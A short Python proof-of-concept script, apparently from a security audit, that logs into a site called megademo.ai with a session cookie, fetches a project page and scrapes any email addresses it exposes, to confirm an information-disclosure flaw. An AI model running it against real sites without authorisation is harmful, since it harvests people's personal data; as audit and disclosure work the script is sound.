#!/usr/bin/env python3
"""Check whether project detail pages expose owner or team email addresses to any authenticated user."""
import os
import re
import sys

import requests

BASE_URL = os.environ.get('MEGADEMO_BASE_URL', 'https://megademo.ai')
DEFAULT_COOKIE = 'connect.sid=YOUR_SESSION_COOKIE_HERE'
COOKIE = os.environ.get('MEGADEMO_COOKIE', DEFAULT_COOKIE)
EMAIL_RE = re.compile(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+')


def pick_project_slug(html):
    slugs = []
    for slug in re.findall(r'href="/projects/([a-z0-9][a-z0-9-]*)"', html):
        if slug not in {'mine', 'new'} and slug not in slugs:
            slugs.append(slug)
    return slugs[0] if slugs else None


def main():
    session = requests.Session()
    session.headers.update({'User-Agent': 'megademo-security-audit-poc/1.0', 'Cookie': COOKIE})
    browse = session.get(f'{BASE_URL}/projects', timeout=20)
    slug = os.environ.get('MEGADEMO_PROJECT_SLUG') or pick_project_slug(browse.text)

    print(f'GET /projects -> {browse.status_code}')
    print(f'Selected project slug: {slug}')
    if browse.status_code != 200 or not slug:
        print('NOT CONFIRMED: could not identify a project page to inspect.')
        return 1

    detail = session.get(f'{BASE_URL}/projects/{slug}', timeout=20)
    emails = sorted(set(EMAIL_RE.findall(detail.text)))

    print(f'GET /projects/{slug} -> {detail.status_code}')
    print(f'Email matches found: {len(emails)}')
    for email in emails[:10]:
        print(f'  {email}')

    if detail.status_code == 200 and emails:
        print()
        print('CONFIRMED: the project detail page exposed email addresses to an authenticated viewer.')
        return 0

    print()
    print('NOT CONFIRMED: no email addresses were found on the tested project page.')
    return 1


if __name__ == '__main__':
    sys.exit(main())
